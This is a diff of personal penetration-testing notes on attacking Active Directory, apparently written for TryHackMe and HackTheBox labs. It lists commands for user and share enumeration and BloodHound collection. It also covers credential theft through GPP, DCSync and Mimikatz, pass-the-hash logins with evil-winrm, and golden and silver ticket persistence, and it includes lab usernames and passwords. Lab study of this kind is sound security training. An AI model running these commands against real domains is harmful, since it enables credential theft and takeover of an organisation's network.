@@ -31,7 +31,10 @@ normal full nmap scan ([[../../Boxes/TryHackMe/Attacktive Directory (Done)/1 - n
 3268 global ldap
 3269 global ldap ssl
 
-5985 rdp - winrm
+3389 rdp
+5985 winrm
+
+9389 mc-nmf - .NET Message Framing - ADWS - Active Directory Web Services - Active Directory Management Gateway Service
 
 ### hosts file
 
@@ -59,10 +62,27 @@ in the nmap scan we see something like
 
 for some things we need a similar time as the dc (within one minute)
 
+check dc time:
+`ntpdate -q 10.10.10.10`  `-q` for query only
+
+check local time:
+`date`
+
 ##### syncing time from linux
 
-`sudo rdate -n <ipmachine>`
+you might get errors like
+`[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`
 
+disable the automatic update of your time:
+`sudo timedatectl set-ntp false`
+
+set time to the time of your dc (use it's ip):
+`sudo ntpdate 10.10.10.10` or `sudo rdate -n 10.10.10.10`
+
+run time sensitive commands
+
+then turn automatic update back on:
+`sudo timedatectl set-ntp true`
 
 ## Getting credentials
 
@@ -92,11 +112,13 @@ enum usernames
 `nxc smb 10.10.10.10 -u '' -p '' --users`
 `nxc ldap 10.10.10.10 -u '' -p '' --groups`
 
+`rpcclient -U '' -N 10.10.10.10  -c 'enumdomusers'`
+`rpcclient -U '' -N 10.10.10.10  -c 'enumprinters'`
+
 get password policy
 `nxc smb 10.10.10.10 -u '' -p '' --pass-pol`
 
 `smbclient -U '' -N -L //10.10.10.10` (-N = no pass)
-`rpcclient -U '' -N 10.10.10.10`
 
 
 `ldapsearch -x -H ldap://10.10.10.10 -s base namingContexts` get naming context
@@ -110,16 +132,27 @@ without creds or with
 
 ### Found nothing?
 
+`enum4linux -a 10.10.10.10`
+
 `~/tools/kerbrute userenum --dc 10.10.10.10 -d domain.com /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
 
 ### Data sources
 
-##### Found a share
+##### Found a smb share
 
 `smbget -U '' -N --recursive smb://10.10.10.10/myshare` get all files from smb share
 `smbget --user="Guest" --password="" --recursive smb://10.10.10.10/myshare`
 
 `smbclient //10.10.97.172/profiles -U Anonymous`
+
+check sysvol for gp's `SYSVOL\sysvol\Pentes.Local\Policies\{ EE416E94-7362-4587-9CEC-651656DB7538}\Machine\Preferences\Groups\Groups.xml`
+(https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/)
+
+##### Found a ftp
+
+get all files from the ftp server
+`wget -m --ftp-user=Benjamin --ftp-password='Password123!' ftp://10.129.229.8/`
+
 
 ### Passwords
 
@@ -189,12 +222,12 @@ add stuff on:
 [[Tools/impacket-owneredit & -dacledit|impacket-owneredit & -dacledit]]
 [[Tools/bloodyAD|bloodyAD]]
 
-##### [[Tools/ldapdomaindump - dump domain info]]
+##### [[Tools/ldapdomaindump - dump domain info|ldapdomaindump - dump domain info]]
 `ldapdomaindump ldap://10.10.10.10 -u 'domain.com\\mynormaluser' -p 'mypassword'`
 - check the description field from users and computers
 - check if some users have logged in - might be honey pots
 
-##### [[Tools/Bloodhound]]
+##### [[Tools/Bloodhound|Bloodhound]]
 
 on windows:
 `Sharphound.exe --CollectionMethods All --Domain domain.com --ExcludeDCs`
@@ -203,7 +236,11 @@ Stealthier option:
 
 from linux:
 `bloodhound-python -u mynormaluser -p 'mypassword' -d domain.com -dc ad01.domain.com -ns 10.10.10.10 -c all`
-	-c works the same as with sharphound (if you want the stealthier version)
+
+`nxc ldap 10.129.203.207 --dns-server 10.129.203.207 -d administrator.htb -u olivia -p ichliebedich --bloodhound -c All`
+
+`-c` works the same as with sharphound (if you want the stealthier version) for both `nxc ldap --bloodhound` and `bloodhound-python`
+
 
 Starting Bloodhound:
 `bloodhound --no-sandbox`
@@ -241,8 +278,10 @@ when you have local files
 when you have `dcsync` permissions
 `impacket-secretsdump spookysec.local/backup:backup2517860@10.10.229.142 -just-dc`
 
+`evil-winrm -i 10.10.10.10 -u "Administrator" -H 0e0363213e37b94221497260b0bcb4fc`
 
 ##### if we have rdp + local admin
+
 check for local admin
 `net localgroup administrators`
 with bloodhound we can see what users have current sessions on this computer and we can see if any of these users have permissions we want.
@@ -251,10 +290,18 @@ run mimikatz on the computer to dump local lsass hashes
 `Invoke-Mimikatz`
 if we get a hash from a high priv user on the domain we can start a new ps as this user
 `Invoke-Mimikatz -command '"sekurlsa::pth /user:privusername /domain:domain.com /ntlm:thehashwegot /run:powershell.exe"'`
+TODO! put in new mimikatz file too
+
+
+### When we've got a shell
+
+continue using AD specific tools, checking bloodhound...
+
+`whoami /all`
 
 
 
-
+but we also have normal Windows exploration and exploitation: [[../09 - Windows Exploration/- start here (windows)|- start here (windows)]]
 
 
 ### If we got nowhere
@@ -262,3 +309,13 @@ if we get a hash from a high priv user on the domain we can start a new ps as th
 [[pentest ad SVG]]
 [[Links (AD)]]
 ...
+
+
+### Persistance
+
+KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients
+
+##### Golden/Silver tickets
+
+Silver is more discreet - More normal on the network
+
